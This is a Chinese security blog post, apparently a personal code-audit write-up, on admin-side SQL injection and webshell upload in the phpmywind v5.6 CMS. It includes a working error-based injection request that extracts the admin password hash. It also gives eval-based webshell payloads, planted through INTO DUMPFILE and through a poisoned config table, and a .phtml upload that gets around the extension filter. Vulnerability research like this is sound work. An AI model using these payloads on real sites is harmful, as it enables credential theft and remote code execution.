@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="代码审计,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="看js代码看到自闭，于是找个cms审计一波找找自信，找了phpmywind v5.6 有几个鸡肋的后台sql注入，还有两种getshell的方法 phpmywind v5.6 后台sql注入先从index.php看起，包含了/include/config.inc.php，审计一下，在第46行开始，很明显的变量覆盖 12345678910111213foreach(array(&apos;_GET&apos;,&apos;_PO">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpmywind v5.6 后台sql注入+getshell">
+<meta property="og:url" content="http://yoursite.com/2020/02/27/phpmywind-v5-6/index.html">
+<meta property="og:site_name" content="Moyu&#39;s blog">
+<meta property="og:description" content="看js代码看到自闭，于是找个cms审计一波找找自信，找了phpmywind v5.6 有几个鸡肋的后台sql注入，还有两种getshell的方法 phpmywind v5.6 后台sql注入先从index.php看起，包含了/include/config.inc.php，审计一下，在第46行开始，很明显的变量覆盖 12345678910111213foreach(array(&apos;_GET&apos;,&apos;_PO">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/2020/02/27/phpmywind-v5-6/image-20200227171314789.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/27/phpmywind-v5-6/image-20200227172239257.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/27/phpmywind-v5-6/image-20200227174505260.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/27/phpmywind-v5-6/image-20200227174554170.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/27/phpmywind-v5-6/image-20200227175237431.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/27/phpmywind-v5-6/image-20200227175621665.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/27/phpmywind-v5-6/image-20200227175707114.png">
+<meta property="og:updated_time" content="2020-03-05T03:40:55.338Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpmywind v5.6 后台sql注入+getshell">
+<meta name="twitter:description" content="看js代码看到自闭，于是找个cms审计一波找找自信，找了phpmywind v5.6 有几个鸡肋的后台sql注入，还有两种getshell的方法 phpmywind v5.6 后台sql注入先从index.php看起，包含了/include/config.inc.php，审计一下，在第46行开始，很明显的变量覆盖 12345678910111213foreach(array(&apos;_GET&apos;,&apos;_PO">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/27/phpmywind-v5-6/image-20200227171314789.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/27/phpmywind-v5-6/">
+
+
+
+
+
+  <title>phpmywind v5.6 后台sql注入+getshell | Moyu's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Moyu's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/27/phpmywind-v5-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Moyu">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/wlp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyu's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">phpmywind v5.6 后台sql注入+getshell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-02-27T21:27:13+08:00">
+                2020-02-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  935
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>看js代码看到自闭，于是找个cms审计一波找找自信，找了phpmywind v5.6</p>
+<p>有几个鸡肋的后台sql注入，还有两种getshell的方法</p>
+<h3 id="phpmywind-v5-6-后台sql注入"><a href="#phpmywind-v5-6-后台sql注入" class="headerlink" title="phpmywind v5.6 后台sql注入"></a>phpmywind v5.6 后台sql注入</h3><p>先从index.php看起，包含了/include/config.inc.php，审计一下，在第46行开始，很明显的变量覆盖</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_v)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen($_k)&gt;<span class="number">0</span> &amp;&amp;</span><br><span class="line">		   preg_match(<span class="string">'#^(GLOBALS|_GET|_POST|_SESSION|_COOKIE)#'</span>,$_k))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">'不允许请求的变量名!'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$&#123;$_k&#125; = _RunMagicQuotes($_v);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说包含这个文件的代码都有可能产生变量覆盖漏洞，然后经过搜索+寻找</p>
+<p>在admin/info_update.php中第55行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$row = $dosql-&gt;GetOne(<span class="string">"SELECT * FROM `#@__info` WHERE `classid`=$id AND `mainid`=-1"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>在这之前并没有给$id赋值</p>
+<p>跟进GetOne</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetOne</span><span class="params">($sql=<span class="string">''</span>,$acctype=MYSQLI_ASSOC)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $dosql;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;Execute($sql, <span class="string">'one'</span>);</span><br><span class="line">    $res = <span class="keyword">$this</span>-&gt;GetArray(<span class="string">'one'</span>, $acctype);</span><br><span class="line">    <span class="keyword">if</span>(!is_array($res))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;FreeResult(<span class="string">'one'</span>);</span><br><span class="line">        <span class="keyword">return</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行了Execute，跟进看一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Execute</span><span class="params">($sql=<span class="string">''</span>,$id=<span class="string">'me'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//SQL语句安全检查</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;safecheck)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;CheckSql(<span class="keyword">$this</span>-&gt;querystring);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;result[$id] = mysqli_query(<span class="keyword">$this</span>-&gt;linkid, <span class="keyword">$this</span>-&gt;querystring);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过了安全检测，跟进CheckSql，主要是要绕过这个CheckSql</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($querytype == <span class="string">'select'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[^0-9a-z@\._-]&#123;1,&#125;(union|sleep|benchmark|load_file|outfile)[^0-9a-z@\.-]&#123;1,&#125;/'</span>, $sql))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;DisplayError(<span class="string">"$sql||SelectBreak"</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>经过搜索，这个是80sec提供的过滤函数，搜一下绕过方式，可以报错注入，exp如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/info_update.php?id=1 AND id in (char(@`&apos;`), extractvalue(1, concat_ws(0x20, 0x5c,(select password from pmw_admin limit 0,1))),char(@`&apos;`))</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20200227171314789.png" alt="image-20200227171314789"></p>
+<p>虽然这个洞纯鸡肋，但是利用思路还是可以学习一下的</p>
+<h3 id="phpmywind-v5-6-后台getshell"><a href="#phpmywind-v5-6-后台getshell" class="headerlink" title="phpmywind v5.6 后台getshell"></a>phpmywind v5.6 后台getshell</h3><p>网站后台直接可以执行sql语句，可以查看一下后台的过滤</p>
+<p><img src="image-20200227172239257.png" alt="image-20200227172239257"></p>
+<p>禁用了into outfile，但是没有禁用into dumpfile</p>
+<p>所以直接执行就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 0x3c3f70687020406576616c28245f524551554553545b615d293b3f3e into dumpfile “/var/www/html/PHPMyWind_v5.6/shell.php”</span><br></pre></td></tr></table></figure>
+
+<p>我本地的环境并没有给mysql写文件的权限，所以这个并没有利用成功</p>
+<p>既然无法写文件，只好找从数据库中取数据的地方了，看看有没有可以利用的地方</p>
+<p>admin/site_save.php 这个文件是将配置写入config.cache.php的，看关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteConfig</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $dosql;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	$str = <span class="string">'&lt;?php	if(!defined(\'IN_PHPMYWIND\')) exit(\'Request Error!\');'</span>.<span class="string">"\r\n\r\n"</span>;</span><br><span class="line">	$dosql-&gt;Execute(<span class="string">"SELECT `varname`,`vartype`,`varvalue`,`vargroup` FROM `#@__webconfig` ORDER BY `orderid` ASC"</span>);</span><br><span class="line">	<span class="keyword">while</span>($row = $dosql-&gt;GetArray())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//统计代码转义</span></span><br><span class="line">		<span class="keyword">if</span>($row[<span class="string">'varname'</span>] == <span class="string">'cfg_countcode'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			$row[<span class="string">'varvalue'</span>] = stripslashes($row[<span class="string">'varvalue'</span>]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($row[<span class="string">'vartype'</span>] == <span class="string">'number'</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>($row[<span class="string">'varvalue'</span>] == <span class="string">''</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				$row[<span class="string">'varvalue'</span>] = <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			$str .= <span class="string">"\$&#123;$row['varname']&#125; = "</span>.$row[<span class="string">'varvalue'</span>].<span class="string">";\r\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			$str .= <span class="string">"\$&#123;$row['varname']&#125; = '"</span>.str_replace(<span class="string">"'"</span>,<span class="string">''</span>,$row[<span class="string">'varvalue'</span>]).<span class="string">"';\r\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$str .= <span class="string">'?&gt;'</span>;</span><br><span class="line"></span><br><span class="line">	Writef(PHPMYWIND_INC.<span class="string">'/config.cache.php'</span>,$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从数据库取值然后写到配置文件中，虽然在向数据库中写数据的过程中进行了过滤，但是从数据库中取数据写入文件的过程中并没有对从数据库中取出的数据进行过滤，这样可以在后台直接更新数据库中的内容，将webshell写到配置文件中</p>
+<p>先在后台执行如下sql语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update pmw_webconfig set varname = &apos;a=1;eval($_REQUEST[a]);//&apos; where orderid=97</span><br></pre></td></tr></table></figure>
+
+<p>运行之后添加一个新的站点</p>
+<p><img src="image-20200227174505260.png" alt="image-20200227174505260"></p>
+<p>这时在前台直接就可以执行命令了</p>
+<p><img src="image-20200227174554170.png" alt="image-20200227174554170"></p>
+<p>其实还有一个利用点，但是需要开了phtml解析才能用，利用如下</p>
+<p>先添加phtml后缀</p>
+<p><img src="image-20200227175237431.png" alt="image-20200227175237431"></p>
+<p>这里后台还是有过滤的，在data/httpfile/upload.class.php中，第53行开始</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(in_array($tempfile_ext, explode(<span class="string">'|'</span>, <span class="string">'php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml'</span>)))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'您上传的文件类型为：['</span>.$tempfile_ext.<span class="string">']，该类文件不允许通过后台上传！'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是没有过滤phtml后缀，直接上传一个就可以getshell了，路径也给出来了</p>
+<p><img src="image-20200227175621665.png" alt="image-20200227175621665"></p>
+<p>直接访问就好了</p>
+<p><img src="image-20200227175707114.png" alt="image-20200227175707114"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/24/gyctf/" rel="next" title="i春秋 gyctf web writeup">
+                <i class="fa fa-chevron-left"></i> i春秋 gyctf web writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
+            
+              <p class="site-author-name" itemprop="name">Moyu</p>
+              <p class="site-description motion-element" itemprop="description">hack for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#phpmywind-v5-6-后台sql注入"><span class="nav-number">1.</span> <span class="nav-text">phpmywind v5.6 后台sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpmywind-v5-6-后台getshell"><span class="nav-number">2.</span> <span class="nav-text">phpmywind v5.6 后台getshell</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Moyu</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
